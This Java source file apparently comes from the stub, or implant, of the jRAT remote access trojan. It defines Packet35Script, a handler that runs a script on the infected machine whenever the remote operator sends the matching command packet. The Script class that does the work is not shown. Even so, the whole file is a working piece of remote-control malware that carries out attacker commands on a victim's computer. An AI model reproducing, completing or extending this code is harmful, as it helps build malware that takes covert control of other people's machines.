package se.jrat.stub.packets.incoming;

import se.jrat.stub.Script;

public class Packet35Script extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		new Script().perform();
	}

}
